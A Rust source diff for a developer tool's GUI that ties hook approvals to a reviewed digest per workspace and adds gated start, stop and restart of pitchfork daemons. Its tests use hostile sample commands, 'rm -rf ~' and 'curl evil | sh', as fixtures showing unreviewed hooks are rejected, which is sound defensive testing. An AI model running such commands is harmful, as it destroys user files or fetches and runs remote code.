@@ -5,9 +5,12 @@ use crate::{
     activity::Activity,
     jobs::{
         self, ChannelProgress, Done, EVENT_QUEUE, Event, Failure, FailureKind, MAX_EVENTS_PER_TICK,
-        Probe,
+        PitchforkSource, Probe, ProcessNote,
     },
-    model::{ConfigIdentity, ConfigModel, ReloadTarget, RequestKey, Section, WorkspaceRef},
+    model::{
+        ConfigIdentity, ConfigModel, ProcessTarget, ReloadTarget, RequestKey, Section, WorkspaceRef,
+    },
+    redaction::RefusalView,
     settings::{self, LaunchPoll},
     state::{AppEvent, AppState, MAX_JOBS, sleep, truncate},
 };
@@ -15,7 +18,7 @@ use anyhow::{Context as _, Result};
 use devflow_core::{
     config::ConfigDocument,
     db::{DataSource, Server},
-    pitchfork,
+    processes::{self, ProcessReport, StartOptions, StopOptions},
     project::Project,
     receipt::Status,
     setup::{self, CreateRequest, RemoveOptions, SetupOptions, SetupOutcome},
@@ -31,6 +34,11 @@ use std::{
     sync::{Arc, mpsc},
     time::Duration,
 };
+use uuid::Uuid;
+
+/// A title or label that names a workspace, snapshot or daemon, as it is drawn:
+/// those names are legal even when they look like credentials.
+pub(crate) use crate::redaction::shown;
 
 /// How often a running job's progress is applied to the UI.
 const TICK: Duration = Duration::from_millis(100);
@@ -47,22 +55,28 @@ pub enum TrustChoice {
     NotNeeded,
     /// The user reviewed exactly this content and wants it to run, for this
     /// one operation (and, for "Trust and run", the approval is stored first).
-    Reviewed(Scope),
+    Reviewed(Box<Scope>),
     /// Run without hooks' approval: core skips them and marks the workspace
     /// `needs_attention`.
     Skip,
 }
 
 impl TrustChoice {
-    fn trust_hooks(&self) -> bool {
-        matches!(self, Self::Reviewed(_))
+    /// The approval core receives: bound to the digest the user reviewed, so
+    /// core runs nothing in a workspace whose own scope differs from it.
+    fn approval(&self) -> Option<trust::Approval> {
+        match self {
+            Self::Reviewed(scope) => Some(trust::Approval::of(scope)),
+            Self::NotNeeded | Self::Skip => None,
+        }
     }
 }
 
-/// Is the loaded project still the one whose hooks were reviewed?
-pub fn reviewed_matches(project: &Project, trust: &TrustChoice) -> bool {
+/// Is the loaded project still the one whose hooks were reviewed, in the
+/// workspace at `target` that the review was of?
+pub fn reviewed_matches(project: &Project, target: &Path, trust: &TrustChoice) -> bool {
     match trust {
-        TrustChoice::Reviewed(scope) => trust::scope(project).digest == scope.digest,
+        TrustChoice::Reviewed(scope) => trust::scope_at(project, target).digest == scope.digest,
         TrustChoice::NotNeeded | TrustChoice::Skip => true,
     }
 }
@@ -75,25 +89,26 @@ pub enum Approval {
     Changed {
         message: String,
         project: Arc<Project>,
-        scope: Scope,
+        scope: Box<Scope>,
     },
     Failed(String),
 }
 
-/// Approve exactly `scope` for `project` (blocking; run it off the UI thread).
-pub fn approve_reviewed(project: &Project, scope: &Scope) -> Approval {
-    match jobs::catch(|| trust::approve_scope(project, scope)) {
+/// Approve exactly `scope`, the scope of the workspace at `target`, for
+/// `project` (blocking; run it off the UI thread).
+pub fn approve_reviewed(project: &Project, target: &Path, scope: &Scope) -> Approval {
+    match jobs::catch(|| trust::approve_scope_at(project, target, scope)) {
         Ok(()) => Approval::Approved,
         Err(message) => match jobs::catch(|| project.reload()) {
             Ok(fresh) => {
-                let fresh_scope = trust::scope(&fresh);
+                let fresh_scope = trust::scope_at(&fresh, target);
                 if fresh_scope.digest == scope.digest {
                     Approval::Failed(message)
                 } else {
                     Approval::Changed {
                         message,
                         project: Arc::new(fresh),
-                        scope: fresh_scope,
+                        scope: Box::new(fresh_scope),
                     }
                 }
             }
@@ -124,7 +139,8 @@ pub fn remove_options(
         force: choice.force,
         keep_data: choice.keep_data,
         delete_branch: choice.delete_branch,
-        trust_hooks: trust.trust_hooks(),
+        approval: trust.approval(),
+        pitchfork: None,
         cwd: cwd.map(Path::to_path_buf),
         expect: Some(target.expected()),
     }
@@ -139,6 +155,18 @@ pub enum FailureHint {
         target: WorkspaceRef,
         choice: RemoveChoice,
     },
+    /// The job asks core to start or stop the processes of the workspace at
+    /// this directory: a refusal of core's is kept for that workspace.
+    Processes { path: PathBuf },
+}
+
+impl FailureHint {
+    fn process_path(&self) -> Option<&Path> {
+        match self {
+            Self::Processes { path } => Some(path),
+            _ => None,
+        }
+    }
 }
 
 /// A forced removal is offered only for a protection core says `force`
@@ -168,7 +196,7 @@ impl JobMeta {
 }
 
 impl AppState {
-    fn start_job(
+    pub(crate) fn start_job(
         &mut self,
         title: String,
         show_activity: bool,
@@ -177,6 +205,9 @@ impl AppState {
         cx: &mut Context<Self>,
         work: impl FnOnce(Arc<Project>, &mut ChannelProgress) -> Result<Done> + Send + 'static,
     ) {
+        // A title is drawn (toast, activity, titlebar). Callers mask the names
+        // in it where they build it (`shown`): masking it again would also eat
+        // what follows a masked value ("password=***@v1").
         let Some(model) = self.selection.current_mut() else {
             return;
         };
@@ -197,6 +228,7 @@ impl AppState {
         }
         // A refresh already running predates this mutation.
         model.invalidate_refresh();
+        self.invalidate_summary(key.project);
         self.mutating.insert(key.project, title.clone());
         self.inflight += 1;
         if show_activity {
@@ -280,12 +312,14 @@ impl AppState {
         self.mutating.remove(&key.project);
         self.inflight = self.inflight.saturating_sub(1);
         let result = result.map(Done::redacted);
+        self.keep_process_refusals(key, &meta, &result);
         if let Some(activity) = self
             .activity
             .as_mut()
             .filter(|a| a.key.project == key.project)
         {
             activity.outcome = Some(result.clone().map_err(|failure| failure.message));
+            activity.finished_at = Some(chrono::Local::now());
         }
         match &result {
             Ok(done) => {
@@ -341,12 +375,52 @@ impl AppState {
                 model.selected_workspace = Some(name.clone());
             }
             self.refresh(cx);
+        } else {
+            // The sidebar's list of its workspaces is older than the job.
+            self.invalidate_summary(key.project);
+            if self.expanded.contains(&key.project) {
+                self.refresh_summary(key.project, cx);
+            }
         }
+        // The job's slot is free: reads of the sidebar that waited can start.
+        self.start_queued_summaries(cx);
         cx.notify();
     }
 
+    /// A start that core refused is kept for its workspace, where the detail
+    /// explains it; a start that worked, or a clear answer, forgets it.
+    fn keep_process_refusals(
+        &mut self,
+        key: RequestKey,
+        meta: &JobMeta,
+        result: &Result<Done, Failure>,
+    ) {
+        let Some(model) = self.selection.accept(key) else {
+            return;
+        };
+        match result {
+            Ok(done) => {
+                if let Some(note) = &done.process {
+                    match &note.refusal {
+                        Some(refusal) => {
+                            model.refusals.insert(note.path.clone(), refusal.clone());
+                        }
+                        None => {
+                            model.refusals.remove(&note.path);
+                        }
+                    }
+                }
+            }
+            Err(failure) => {
+                if let (Some(refusal), Some(path)) = (&failure.refusal, meta.hint.process_path()) {
+                    model.refusals.insert(path.to_path_buf(), refusal.clone());
+                }
+            }
+        }
+    }
+
     /// One-shot background work that does not hold the project's mutation lock.
-    fn spawn_light<T: Send + 'static>(
+    pub(crate) fn spawn_light<T: Send + 'static>(
         &mut self,
         window: &mut Window,
         cx: &mut Context<Self>,
@@ -368,6 +442,7 @@ impl AppState {
     fn hooks_unchanged(
         &self,
         trust: &TrustChoice,
+        target: &Path,
         title: &str,
         window: &mut Window,
         cx: &mut App,
@@ -376,16 +451,25 @@ impl AppState {
             .selection
             .current()
             .and_then(|m| m.project.as_ref())
-            .is_none_or(|project| reviewed_matches(project, trust));
+            .is_none_or(|project| reviewed_matches(project, target, trust));
         if !unchanged {
             Self::notify_error(
                 window,
                 cx,
                 title,
-                "The project's hooks changed after you reviewed them. Start again to review them.",
+                "What this workspace asks to run changed after you reviewed it. Start again to review it.",
             );
         }
         unchanged
+    }
+
+    /// The directory a review for workspace `name` (the default workspace
+    /// when `None`) is about.
+    pub fn trust_target(&self, name: Option<&str>) -> PathBuf {
+        match self.selection.current() {
+            Some(model) => model.trust_dir(name),
+            None => PathBuf::new(),
+        }
     }
 
     pub fn create_workspace(
@@ -397,10 +481,13 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Create workspace {name}");
-        if !self.hooks_unchanged(&trust, &title, window, cx) {
+        let title = shown(&format!("Create workspace {name}"));
+        // The review was of the workspace the new one is made from.
+        let source = self.trust_target(from.as_deref());
+        if !self.hooks_unchanged(&trust, &source, &title, window, cx) {
             return;
         }
+        let source = self.pitchfork.clone();
         self.start_job(
             title,
             true,
@@ -413,12 +500,14 @@ impl AppState {
                     from,
                     options: SetupOptions {
                         data_from,
-                        trust_hooks: trust.trust_hooks(),
+                        approval: trust.approval(),
                         ..Default::default()
                     },
                 };
                 let outcome = setup::create(&project, request, progress)?;
-                Ok(done_from(format!("Created workspace {name}"), &outcome))
+                let mut done = done_from(format!("Created workspace {name}"), &outcome);
+                note_autostart(&mut done, &source, &project, &outcome);
+                Ok(done)
             },
         );
     }
@@ -430,10 +519,11 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Set up {}", workspace.name);
-        if !self.hooks_unchanged(&trust, &title, window, cx) {
+        let title = shown(&format!("Set up {}", workspace.name));
+        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
             return;
         }
+        let source = self.pitchfork.clone();
         self.start_job(
             title,
             true,
@@ -442,12 +532,14 @@ impl AppState {
             cx,
             move |project, progress| {
                 let options = SetupOptions {
-                    trust_hooks: trust.trust_hooks(),
+                    approval: trust.approval(),
                     ..Default::default()
                 };
                 let outcome = setup::setup(&project, &workspace, options, false, false, progress)?
                     .context("setup did not run")?;
-                Ok(done_from(format!("Set up {}", workspace.name), &outcome))
+                let mut done = done_from(format!("Set up {}", workspace.name), &outcome);
+                note_autostart(&mut done, &source, &project, &outcome);
+                Ok(done)
             },
         );
     }
@@ -460,7 +552,7 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Remove workspace {}", target.name);
+        let title = shown(&format!("Remove workspace {}", target.name));
         // The request may have been made in another selection or before the
         // workspace was recreated: it must name this project's workspace. This
         // checks only the GUI's cached view; core re-checks `expect` against
@@ -478,7 +570,7 @@ impl AppState {
             );
             return;
         }
-        if !self.hooks_unchanged(&trust, &title, window, cx) {
+        if !self.hooks_unchanged(&trust, &target.path, &title, window, cx) {
             return;
         }
         let hint = if choice.force {
@@ -493,9 +585,16 @@ impl AppState {
         self.start_job(title, true, hint, window, cx, move |project, progress| {
             let options = remove_options(&choice, &trust, cwd.as_deref(), &target);
             let outcome = setup::remove(&project, &target.name, options, progress)?;
+            let mut warnings = outcome.warnings;
+            if !outcome.stopped_daemons.is_empty() {
+                warnings.push(format!(
+                    "Stopped {} pitchfork daemon(s) first.",
+                    outcome.stopped_daemons.len()
+                ));
+            }
             Ok(Done {
                 summary: format!("Removed workspace {}", target.name),
-                warnings: outcome.warnings,
+                warnings,
                 ..Default::default()
             })
         });
@@ -544,7 +643,7 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Snapshot {name}");
+        let title = shown(&format!("Snapshot {name}"));
         self.start_job(
             title,
             false,
@@ -568,7 +667,7 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Delete snapshot {name}@v{version}");
+        let title = shown(&format!("Delete snapshot {name}@v{version}"));
         self.start_job(
             title,
             false,
@@ -592,7 +691,7 @@ impl AppState {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let title = format!("Reset data of {}", workspace.name);
+        let title = shown(&format!("Reset data of {}", workspace.name));
         self.start_job(
             title,
             false,
@@ -609,29 +708,169 @@ impl AppState {
         );
     }
 
-    // ---- daemons ------------------------------------------------------------------
+    // ---- processes ----------------------------------------------------------------
 
-    pub fn daemon_action(
+    /// The workspace `target` was drawn for, and the instance core must still
+    /// find in it: the open project must be the one the button belonged to, and
+    /// the checkout at that path the one it showed. Nothing reads the selection:
+    /// the selected workspace may be another one by now.
+    fn process_workspace(
+        &self,
+        target: &ProcessTarget,
+    ) -> Result<(Workspace, Option<Uuid>), String> {
+        self.open_project_for(&target.project)?;
+        let listed = self
+            .selection
+            .current()
+            .and_then(|m| m.workspaces.iter().find(|w| w.workspace.path == target.path))
+            .ok_or_else(|| {
+                "The workspace this was opened for is gone from the list, so nothing was started or stopped. Look at it again."
+                    .to_string()
+            })?;
+        let held = listed.receipt.as_ref().map(|r| r.instance_id);
+        if let (Some(shown), Some(held)) = (target.instance, held)
+            && shown != held
+        {
+            return Err(format!(
+                "The workspace at {} is another instance now ({held}, not {shown}), so nothing was started or stopped. Look at it again.",
+                target.path.display()
+            ));
+        }
+        Ok((listed.workspace.clone(), target.instance))
+    }
+
+    /// Start the selected workspace's daemons (`only` names some of them; none
+    /// means all). Core refuses unless the workspace is ready, its pitchfork
+    /// files are approved (`trust` is the user's review for this one start) and
+    /// no daemon about to start also starts on its own.
+    pub fn start_processes(
         &mut self,
-        id: String,
-        start: bool,
+        target: ProcessTarget,
+        only: Vec<String>,
+        trust: TrustChoice,
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let Some(target) = self.selection.current().and_then(|m| m.selected_target()) else {
-            return;
-        };
-        let title = format!("{} daemon {id}", if start { "Start" } else { "Stop" });
-        self.start_job(title, false, FailureHint::None, window, cx, move |_, _| {
-            if start {
-                pitchfork::start(&target.path, &id)?;
-            } else {
-                pitchfork::stop(&target.path, &id)?;
+        let (workspace, expect) = match self.process_workspace(&target) {
+            Ok(found) => found,
+            Err(message) => {
+                Self::notify_error(window, cx, "Start the daemons", &message);
+                return;
             }
-            Ok(Done {
-                summary: format!("{} {id}", if start { "Started" } else { "Stopped" }),
-                ..Default::default()
-            })
+        };
+        let title = match only.as_slice() {
+            [one] => shown(&format!("Start {one} in {}", workspace.name)),
+            _ => shown(&format!("Start the daemons of {}", workspace.name)),
+        };
+        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
+            return;
+        }
+        let source = self.pitchfork.clone();
+        let hint = FailureHint::Processes {
+            path: workspace.path.clone(),
+        };
+        self.start_job(title, false, hint, window, cx, move |project, _| {
+            let options = StartOptions {
+                only,
+                approval: trust.approval(),
+                expect_instance: expect,
+                ..StartOptions::default()
+            };
+            let report =
+                processes::start_with(source.resolve().as_ref(), &project, &workspace, &options)?;
+            Ok(process_done(&workspace.name, &report))
+        });
+    }
+
+    /// Stop the selected workspace's daemons. Core stops them only while the
+    /// pitchfork files are the ones that were approved (pitchfork runs a
+    /// daemon's lifecycle hooks from the current file).
+    ///
+    /// `force` goes on when core cannot tell what runs (its `state_unknown`
+    /// refusal): the person was told and said so.
+    pub fn stop_processes(
+        &mut self,
+        target: ProcessTarget,
+        force: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let (workspace, expect) = match self.process_workspace(&target) {
+            Ok(found) => found,
+            Err(message) => {
+                Self::notify_error(window, cx, "Stop the daemons", &message);
+                return;
+            }
+        };
+        let title = shown(&format!(
+            "Stop the daemons of {}{}",
+            workspace.name,
+            if force {
+                " without knowing what runs"
+            } else {
+                ""
+            }
+        ));
+        let source = self.pitchfork.clone();
+        let hint = FailureHint::Processes {
+            path: workspace.path.clone(),
+        };
+        self.start_job(title, false, hint, window, cx, move |project, _| {
+            let report = processes::stop_with(
+                source.resolve().as_ref(),
+                &project,
+                &workspace,
+                &StopOptions {
+                    force,
+                    expect_instance: expect,
+                    ..StopOptions::default()
+                },
+            )?;
+            Ok(process_done(&workspace.name, &report))
+        });
+    }
+
+    /// Stop, then start again: both steps are gated like the buttons they stand for.
+    pub fn restart_processes(
+        &mut self,
+        target: ProcessTarget,
+        trust: TrustChoice,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let (workspace, expect) = match self.process_workspace(&target) {
+            Ok(found) => found,
+            Err(message) => {
+                Self::notify_error(window, cx, "Restart the daemons", &message);
+                return;
+            }
+        };
+        let title = shown(&format!("Restart the daemons of {}", workspace.name));
+        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
+            return;
+        }
+        let source = self.pitchfork.clone();
+        let hint = FailureHint::Processes {
+            path: workspace.path.clone(),
+        };
+        self.start_job(title, false, hint, window, cx, move |project, _| {
+            let start = StartOptions {
+                approval: trust.approval(),
+                expect_instance: expect,
+                ..StartOptions::default()
+            };
+            let report = processes::restart_with(
+                source.resolve().as_ref(),
+                &project,
+                &workspace,
+                &start,
+                &StopOptions {
+                    approval: trust.approval(),
+                    expect_instance: expect,
+                    ..StopOptions::default()
+                },
+            )?;
+            Ok(process_done(&workspace.name, &report))
         });
     }
 
@@ -872,15 +1111,108 @@ fn server_of(project: &Project) -> Result<Server> {
 
 fn done_from(summary: String, outcome: &SetupOutcome) -> Done {
     let needs_attention = outcome.status == Status::NeedsAttention;
+    let mut warnings = outcome.warnings.clone();
+    if outcome.approval_differs {
+        warnings.push(
+            "This workspace holds other hooks, [env] or pitchfork files than the ones you \
+             reviewed, so none of them ran. Choose Set up on it to review its own."
+                .to_string(),
+        );
+    }
     Done {
         summary: if needs_attention {
             format!("{summary}, but it needs attention (see the output)")
         } else {
             summary
         },
-        warnings: outcome.warnings.clone(),
+        warnings,
         needs_attention,
         select_workspace: Some(outcome.workspace.name.clone()),
+        process: None,
+    }
+}
+
+/// What `[pitchfork] autostart` did after a setup that left the workspace
+/// ready, as one line for the notification (and the refusal, if core gave one,
+/// for the workspace's detail). Process state is reported apart from
+/// readiness: nothing here changes the workspace's status.
+fn note_autostart(
+    done: &mut Done,
+    source: &PitchforkSource,
+    project: &Project,
+    outcome: &SetupOutcome,
+) {
+    if outcome.status != Status::Ready {
+        return;
+    }
+    let Some(autostart) = processes::autostart(
+        source.resolve().as_ref(),
+        project,
+        &outcome.workspace,
+        processes::DEFAULT_START_TIMEOUT,
+    ) else {
+        return;
+    };
+    let line = match (&autostart.report, &autostart.skipped) {
+        (Some(report), _) => process_done(&outcome.workspace.name, report).line(),
+        (None, Some(why)) => format!("Daemons were not started: {why}"),
+        (None, None) => return,
+    };
+    done.warnings.push(line);
+    done.process = Some(ProcessNote {
+        path: outcome.workspace.path.clone(),
+        refusal: autostart.refusal.as_ref().map(RefusalView::of),
+    });
+}
+
+/// What a start or stop reports: the summary, and everything pitchfork or
+/// devflow had to say (its timeout, its error, a state it could not read).
+fn process_done(workspace: &str, report: &ProcessReport) -> Done {
+    let running = report.daemons.iter().filter(|d| d.is_active()).count();
+    let ok = report.ok();
+    let summary = match (report.action, ok) {
+        (processes::Action::Start, true) => {
+            format!("{running} daemon(s) running in {workspace}")
+        }
+        (processes::Action::Start, false) => {
+            format!("Started the daemons of {workspace}, but not everything is running")
+        }
+        (processes::Action::Stop, true) => format!("Stopped the daemons of {workspace}"),
+        (processes::Action::Stop, false) => {
+            format!("Stopped the daemons of {workspace}, but some still run")
+        }
+    };
+    let mut warnings = report.warnings.clone();
+    warnings.extend(report.error.clone());
+    if let Some(error) = &report.state_error {
+        warnings.push(format!("Could not read pitchfork's state: {error}"));
+    }
+    let failed_ones = report.daemons.iter().filter(|d| {
+        d.failed()
+            && report.action == processes::Action::Start
+            && (report.requested.is_empty() || report.requested.contains(&d.name))
+    });
+    for daemon in failed_ones {
+        warnings.push(format!(
+            "{} {}{}",
+            daemon.name,
+            daemon.state,
+            daemon
+                .error
+                .as_deref()
+                .map(|e| format!(": {e}"))
+                .unwrap_or_default()
+        ));
+    }
+    Done {
+        summary,
+        warnings,
+        needs_attention: !ok,
+        select_workspace: None,
+        process: Some(ProcessNote {
+            path: report.path.clone(),
+            refusal: None,
+        }),
     }
 }
 
@@ -892,13 +1224,22 @@ mod tests {
     use uuid::Uuid;
 
     fn scope(setup: &[&str], switch: &[&str], teardown: &[&str]) -> Scope {
-        Scope {
-            setup: setup.iter().map(|s| s.to_string()).collect(),
-            switch: switch.iter().map(|s| s.to_string()).collect(),
-            teardown: teardown.iter().map(|s| s.to_string()).collect(),
-            timeout: "15m".into(),
-            digest: format!("{setup:?}{switch:?}{teardown:?}"),
-        }
+        let list = |commands: &[&str]| {
+            commands
+                .iter()
+                .map(|c| format!("{c:?}"))
+                .collect::<Vec<_>>()
+                .join(", ")
+        };
+        let config = devflow_core::Config::parse(&format!(
+            "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n\
+             [hooks]\nsetup = [{}]\nswitch = [{}]\nteardown = [{}]\n",
+            list(setup),
+            list(switch),
+            list(teardown)
+        ))
+        .unwrap();
+        Scope::build(&config, std::path::Path::new("/nonexistent"))
     }
 
     fn target() -> WorkspaceRef {
@@ -945,10 +1286,19 @@ mod tests {
         );
         assert_eq!(options.cwd.as_deref(), Some(Path::new("/work")));
         assert!(options.keep_data && options.delete_branch && !options.force);
-        assert!(!options.trust_hooks);
-        let reviewed = TrustChoice::Reviewed(scope(&["a"], &[], &[]));
-        assert!(remove_options(&choice, &reviewed, None, &target).trust_hooks);
-        assert!(!remove_options(&choice, &TrustChoice::Skip, None, &target).trust_hooks);
+        assert!(options.approval.is_none());
+        let shown = scope(&["a"], &[], &[]);
+        let reviewed = TrustChoice::Reviewed(Box::new(shown.clone()));
+        assert_eq!(
+            remove_options(&choice, &reviewed, None, &target).approval,
+            Some(trust::Approval::of(&shown)),
+            "the approval is bound to the digest that was shown"
+        );
+        assert!(
+            remove_options(&choice, &TrustChoice::Skip, None, &target)
+                .approval
+                .is_none()
+        );
     }
 
     #[test]
@@ -987,6 +1337,7 @@ mod tests {
         TrustState::Untrusted {
             digest: "d".into(),
             previously_trusted: false,
+            format_changed: false,
         }
     }
 
@@ -1013,7 +1364,7 @@ mod tests {
             false
         ));
         assert!(!needs_trust_prompt(
-            Some(&TrustState::NoHooks),
+            Some(&TrustState::NothingToApprove),
             &both,
             false,
             false
@@ -1021,23 +1372,183 @@ mod tests {
         assert!(!needs_trust_prompt(None, &both, false, false));
         // DEVFLOW_TRUST_HOOKS: no dialog; core honours the variable itself.
         assert!(!needs_trust_prompt(Some(&untrusted), &both, false, true));
+        // `[env]` recipes are applied by setup, so they are a reason to ask
+        // even without setup hooks; pitchfork processes alone are not (neither
+        // setting up nor removing starts them), and nor is removing.
+        let config = |extra: &str| {
+            let head =
+                "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";
+            devflow_core::Config::parse(&format!("{head}{extra}")).unwrap()
+        };
+        let build = |extra: &str, dir: &std::path::Path| Scope::build(&config(extra), dir);
+        let nowhere = std::path::Path::new("/nonexistent");
+        let env_only = build("[env]\nA = \"1\"\n", nowhere);
+        assert!(needs_trust_prompt(
+            Some(&untrusted),
+            &env_only,
+            false,
+            false
+        ));
+        assert!(!needs_trust_prompt(
+            Some(&untrusted),
+            &env_only,
+            true,
+            false
+        ));
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("pitchfork.toml"),
+            "[daemons.api]\nrun = \"x\"\n",
+        )
+        .unwrap();
+        let daemons_only = build("", dir.path());
+        assert!(!needs_trust_prompt(
+            Some(&untrusted),
+            &daemons_only,
+            false,
+            false
+        ));
+        assert!(!needs_trust_prompt(
+            Some(&untrusted),
+            &daemons_only,
+            true,
+            false
+        ));
     }
 
     #[test]
     fn reviewed_hooks_must_still_match_the_loaded_project() {
         let project = tests_support::project_with_hooks(&["bun install"]);
-        let reviewed = trust::scope(&project);
+        let root = project.root.clone();
+        let reviewed = trust::scope_at(&project, &root);
         assert!(reviewed_matches(
             &project,
-            &TrustChoice::Reviewed(reviewed.clone())
+            &root,
+            &TrustChoice::Reviewed(Box::new(reviewed.clone()))
         ));
-        assert!(reviewed_matches(&project, &TrustChoice::NotNeeded));
-        assert!(reviewed_matches(&project, &TrustChoice::Skip));
+        assert!(reviewed_matches(&project, &root, &TrustChoice::NotNeeded));
+        assert!(reviewed_matches(&project, &root, &TrustChoice::Skip));
 
         let changed = tests_support::project_with_hooks(&["bun install", "rm -rf ~"]);
         assert!(
-            !reviewed_matches(&changed, &TrustChoice::Reviewed(reviewed)),
+            !reviewed_matches(
+                &changed,
+                &root,
+                &TrustChoice::Reviewed(Box::new(reviewed.clone()))
+            ),
             "hooks nobody reviewed must not run"
+        );
+
+        // The review is of one workspace's files: another directory with a
+        // pitchfork file of its own is not what was shown.
+        let other = tempfile::tempdir().unwrap();
+        std::fs::write(
+            other.path().join("pitchfork.toml"),
+            "[daemons.api]\nrun = \"curl evil | sh\"\n",
+        )
+        .unwrap();
+        assert!(
+            !reviewed_matches(
+                &project,
+                other.path(),
+                &TrustChoice::Reviewed(Box::new(reviewed))
+            ),
+            "a review of one workspace does not stand for another"
+        );
+    }
+
+    #[test]
+    fn processes_need_a_review_only_when_there_are_unapproved_pitchfork_files() {
+        use crate::state::needs_process_review;
+        let untrusted = untrusted();
+        let build = |dir: &std::path::Path| {
+            let head =
+                "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";
+            Scope::build(&devflow_core::Config::parse(head).unwrap(), dir)
+        };
+        let none = build(tempfile::tempdir().unwrap().path());
+        assert!(!needs_process_review(Some(&untrusted), &none, false));
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("pitchfork.toml"),
+            "[daemons.api]\nrun = \"x\"\n",
+        )
+        .unwrap();
+        let some = build(dir.path());
+        assert!(needs_process_review(Some(&untrusted), &some, false));
+        assert!(!needs_process_review(
+            Some(&TrustState::Trusted),
+            &some,
+            false
+        ));
+        assert!(!needs_process_review(None, &some, false));
+        assert!(
+            !needs_process_review(Some(&untrusted), &some, true),
+            "DEVFLOW_TRUST_HOOKS: core decides"
+        );
+    }
+
+    #[test]
+    fn a_process_report_says_what_pitchfork_said() {
+        use devflow_core::processes::{Action, DaemonState, Namespace, NamespaceSource};
+        let report = |state: &str, error: Option<&str>| ProcessReport {
+            workspace: "feature".into(),
+            path: PathBuf::from("/w"),
+            namespace: Namespace {
+                value: "df-0b3c9d2e-a1b2c3d4".into(),
+                source: NamespaceSource::Devflow,
+            },
+            action: Action::Start,
+            requested: Vec::new(),
+            ran: error.is_none(),
+            timed_out: false,
+            error: error.map(str::to_string),
+            daemons: vec![DaemonState {
+                name: "web".into(),
+                id: None,
+                state: state.into(),
+                pid: None,
+                ports: Vec::new(),
+                url: None,
+                error: (state == "errored").then(|| "exit code 3".to_string()),
+                triggers: Vec::new(),
+                configured: true,
+                startable: false,
+            }],
+            state_error: None,
+            warnings: Vec::new(),
+        };
+        let done = process_done("feature", &report("running", None));
+        assert_eq!(done.summary, "1 daemon(s) running in feature");
+        assert!(!done.needs_attention && done.warnings.is_empty());
+        let done = process_done("feature", &report("errored", Some("boom")));
+        assert!(done.needs_attention);
+        assert!(done.summary.contains("not everything is running"));
+        assert!(
+            done.warnings.iter().any(|w| w == "boom"),
+            "{:?}",
+            done.warnings
+        );
+        assert!(
+            done.warnings
+                .iter()
+                .any(|w| w == "web errored: exit code 3"),
+            "{:?}",
+            done.warnings
+        );
+        // pitchfork may decorate a state; core's one classifier reads it, so
+        // the summary counts `running (ready)` and a `failed: exit 3` start is
+        // not "everything is running".
+        let done = process_done("feature", &report("running (ready)", None));
+        assert_eq!(done.summary, "1 daemon(s) running in feature");
+        assert!(!done.needs_attention && done.warnings.is_empty());
+        let done = process_done("feature", &report("failed: exit 3", None));
+        assert!(done.needs_attention);
+        assert!(done.summary.contains("not everything is running"));
+        assert!(
+            done.warnings.iter().any(|w| w == "web failed: exit 3"),
+            "{:?}",
+            done.warnings
         );
     }
 }
@@ -1062,7 +1573,7 @@ pub(crate) mod tests_support {
                     id: uuid::Uuid::nil(),
                 },
                 hooks: HooksSection {
-                    setup: setup.iter().map(|s| s.to_string()).collect(),
+                    setup: setup.iter().map(|s| (*s).into()).collect(),
                     ..HooksSection::default()
                 },
                 ..Config::default()
